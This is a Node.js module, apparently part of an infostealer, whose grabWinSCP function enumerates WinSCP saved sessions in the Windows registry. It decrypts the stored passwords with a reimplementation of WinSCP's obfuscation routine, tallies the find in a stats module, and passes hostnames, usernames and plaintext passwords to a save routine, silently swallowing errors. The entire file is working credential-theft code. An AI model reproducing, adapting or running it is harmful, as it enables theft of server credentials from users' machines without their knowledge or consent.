var Registry = require('winreg');
const { stat } = require('./stats');
const save = require('./save');

function WinSCP() {
    var WSCP_CHARS = [];

    function _simple_decrypt_next_char() {
        if (WSCP_CHARS.length == 0) {
            return 0x00;
        }

        const WSCP_SIMPLE_STRING = '0123456789ABCDEF';

        var a = WSCP_SIMPLE_STRING.indexOf(WSCP_CHARS.shift());
        var b = WSCP_SIMPLE_STRING.indexOf(WSCP_CHARS.shift());

        return 0xFF & ~(((a << 4) + b << 0) ^ 0xA3);
    }

    this.decrypt = function(username, hostname, encrypted) {
        if (!encrypted.match(/[A-F0-9]+/)) {
            return '';
        }
    
        var result = [], key = [username, hostname].join('');
    
        WSCP_CHARS = encrypted.split('');
    
        var flag = _simple_decrypt_next_char(), length;
    
        if (flag == 0xFF) {
            _simple_decrypt_next_char();
            length = _simple_decrypt_next_char();
        } else {
            length = flag;
        }
    
        WSCP_CHARS = WSCP_CHARS.slice(_simple_decrypt_next_char() * 2);
    
        for (var i = 0; i < length; i++) {
            result.push(String.fromCharCode(_simple_decrypt_next_char()));
        }
    
        if (flag == 0xFF) {
            var valid = result.slice(0, key.length).join('');
    
            if (valid != key) {
                result = [];
            } else {
                result = result.slice(key.length);
            }
        }
    
        WSCP_CHARS = [];
    
        return result.join("");
    }
}

async function grabWinSCP() {
    try {
        let connections = [];

        const regKey = new Registry({
            hive: Registry.HKCU,
            key: "\\SOFTWARE\\Martin Prikryl\\WinSCP 2\\Sessions"
        });

        const exists = await new Promise((resolve, reject) => {
            regKey.keyExists((err, exists) => {
                if (err != null) {
                    resolve(false);
                }
                resolve(exists);
            });
        });
        if (!exists) {
            return;
        }

        const subkeys = await new Promise((resolve, reject) => {
            regKey.keys((err, subkeys) => {
                if (err != null) {
                    resolve([]);
                }

                resolve(subkeys);
            })
        });
        if (subkeys.length == 0) {
            return;
        }
        
        stat.AddSysAdmin("WinSCP");

        for (let i = 0; i < subkeys.length; i++) {
            const subkey = subkeys[i];

            const subRegKey = new Registry({
                hive: Registry.HKCU,
                key: subkey.key
            });

            const hostname = await new Promise((resolve, reject) => {
                subRegKey.get("HostName", (err, res) => {
                    if (err == null) {
                        resolve(res.value);
                    }
                    resolve("");
                })
            });

            const username = await new Promise((resolve, reject) => {
                subRegKey.get("UserName", (err, res) => {
                    if (err == null) {
                        resolve(res.value);
                    }
                    resolve("");
                })
            });

            const password = await new Promise((resolve, reject) => {
                subRegKey.get("Password", (err, res) => {
                    if (err == null) {
                        resolve(res.value);
                    }
                    resolve("");
                })
            });

            if (password != "" && username != "" && hostname != "") {
                const winSCP = new WinSCP();
                connections.push({username: username, password: winSCP.decrypt(username, hostname, password), hostname: hostname});
            }
        }

        save.saveSysAdmin(connections, "WinSCP");
    } catch (e) { }
}

module.exports = {
    grabWinSCP
}
